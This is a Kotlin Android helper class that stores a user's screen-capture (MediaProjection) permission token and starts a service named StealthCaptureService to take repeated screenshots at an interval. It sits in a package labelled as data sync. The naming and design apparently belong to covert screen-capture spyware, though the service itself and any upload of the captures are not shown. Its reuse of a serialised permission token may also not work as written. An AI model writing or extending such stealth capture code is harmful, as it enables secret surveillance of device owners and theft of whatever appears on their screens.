package com.example.data.sync

import android.app.Activity
import android.content.Context
import android.content.Intent
import android.os.Build
import android.util.Log
import com.example.service.StealthCaptureService
import com.example.ui.ProjectionPermissionActivity

object MediaProjectionHelper {

    private const val TAG = "MediaProjectionHelper"
    private const val PREFS_NAME = "media_projection_prefs"
    private const val KEY_RESULT_CODE = "result_code"
    private const val KEY_RESULT_DATA = "result_data_uri"

    @Volatile
    private var cachedResultCode: Int = Activity.RESULT_CANCELED

    @Volatile
    private var cachedResultData: Intent? = null

    fun saveProjectionToken(context: Context, resultCode: Int, data: Intent) {
        cachedResultCode = resultCode
        cachedResultData = data
        try {
            val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
            val dataUri = data.toUri(Intent.URI_INTENT_SCHEME)
            prefs.edit()
                .putInt(KEY_RESULT_CODE, resultCode)
                .putString(KEY_RESULT_DATA, dataUri)
                .apply()
            Log.d(TAG, "MediaProjection token saved successfully.")
        } catch (e: Exception) {
            Log.e(TAG, "Error saving MediaProjection token: ${e.message}")
        }
    }

    fun hasProjectionToken(context: Context): Boolean {
        if (cachedResultCode == Activity.RESULT_OK && cachedResultData != null) {
            return true
        }
        val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        val code = prefs.getInt(KEY_RESULT_CODE, Activity.RESULT_CANCELED)
        val dataUri = prefs.getString(KEY_RESULT_DATA, null)
        if (code == Activity.RESULT_OK && !dataUri.isNullOrEmpty()) {
            try {
                val intent = Intent.parseUri(dataUri, Intent.URI_INTENT_SCHEME)
                cachedResultCode = code
                cachedResultData = intent
                return true
            } catch (e: Exception) {
                Log.e(TAG, "Error parsing saved MediaProjection intent URI: ${e.message}")
            }
        }
        return false
    }

    fun getProjectionToken(context: Context): Pair<Int, Intent>? {
        if (hasProjectionToken(context)) {
            val code = cachedResultCode
            val intent = cachedResultData
            if (code == Activity.RESULT_OK && intent != null) {
                return Pair(code, intent)
            }
        }
        return null
    }

    fun clearProjectionToken(context: Context) {
        cachedResultCode = Activity.RESULT_CANCELED
        cachedResultData = null
        try {
            context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
                .edit()
                .clear()
                .apply()
        } catch (_: Exception) {}
    }

    fun requestProjectionPermission(context: Context) {
        try {
            val intent = Intent(context, ProjectionPermissionActivity::class.java).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_SINGLE_TOP)
            }
            context.startActivity(intent)
        } catch (e: Exception) {
            Log.e(TAG, "Error requesting projection permission: ${e.message}")
        }
    }

    fun startService(context: Context, intervalSec: Int = 10, maxShots: Int = 0) {
        val token = getProjectionToken(context)
        if (token != null) {
            val intent = Intent(context, StealthCaptureService::class.java).apply {
                action = StealthCaptureService.ACTION_START
                putExtra(StealthCaptureService.EXTRA_RESULT_CODE, token.first)
                putExtra(StealthCaptureService.EXTRA_RESULT_DATA, token.second)
                putExtra(StealthCaptureService.EXTRA_INTERVAL_SEC, intervalSec)
                putExtra(StealthCaptureService.EXTRA_MAX_SHOTS, maxShots)
            }
            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    context.startForegroundService(intent)
                } else {
                    context.startService(intent)
                }
            } catch (e: Exception) {
                Log.e(TAG, "Failed to start StealthCaptureService: ${e.message}")
            }
        } else {
            requestProjectionPermission(context)
        }
    }

    fun stopService(context: Context) {
        clearProjectionToken(context)
        StealthCaptureService.activeMediaProjection = null
        try {
            val intent = Intent(context, StealthCaptureService::class.java).apply {
                action = StealthCaptureService.ACTION_STOP
            }
            context.startService(intent)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to stop StealthCaptureService: ${e.message}")
        }
    }
}
